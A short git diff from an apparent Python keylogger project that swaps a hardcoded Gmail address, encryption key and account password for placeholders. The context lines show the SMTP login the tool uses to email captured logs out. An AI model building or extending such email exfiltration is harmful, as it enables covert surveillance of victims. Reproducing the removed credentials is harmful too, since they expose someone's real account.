@@ -64,10 +64,10 @@ microphone_time = 10
 time_iteration = 15
 no_of_iteration_end = 3
 
-email_address = "ytparty31@gmail.com"
-toaddr = "ytparty31@gmail.com"
+email_address = "Enter_senders_email"
+toaddr = "Enter_recievers_email"
 
-key = "1lk8ktjhT5YEPccna6wHwtT_aKXu0sEchAdbTlncYmw="
+key = "Enter_key_generated_from_GenerateKey"
 
 #file path for key_log.txt
 file_path = "D:\\Programming\\Projects\\Python\\Cybersecurity\\Keylogger_adv\\Project"
@@ -104,7 +104,7 @@ def send_email(filename, attachment, toaddr):
     s = smtplib.SMTP('smtp.gmail.com', 587)
     s.starttls()
 
-    s.login(fromaddr, "Abhishek353535")
+    s.login(fromaddr, "Enter_senders_email")
 
     text = msg.as_string()
     
